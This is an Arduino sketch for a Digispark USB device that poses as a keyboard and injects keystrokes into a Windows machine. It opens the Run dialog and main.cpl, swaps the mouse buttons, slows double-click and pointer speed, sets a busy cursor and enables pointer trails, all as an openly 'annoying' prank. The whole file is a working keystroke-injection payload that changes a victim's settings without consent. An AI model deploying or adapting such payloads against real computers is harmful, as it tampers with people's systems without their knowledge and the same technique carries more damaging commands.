//sets mouse settings to annoying levels
#include "DigiKeyboard.h"
void setup() {
  #define KEY_TAB 43 //initialize keys needed
  #define KEY_ARROW_RIGHT 0x4F
}

void loop() {
  DigiKeyboard.sendKeyStroke(0); //start program
  DigiKeyboard.delay(500); //delay 500 ms
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //open run.exe 
  DigiKeyboard.delay(500);
  DigiKeyboard.print("main.cpl"); //open mouse settings
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE); //switch primary and secondary buttons
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB); //double-click speed
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT); //make it slowest setting
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT); //go to top tab
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT); //pointers
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT); //change to busy pointer
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT); //go back to top
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT); //pointer options
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB); //pointer speed
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT); //make it slowest setting
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_SPACE); //display pointer trails
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //save settings
  for(;;){ /*empty*/ } //end program 
}
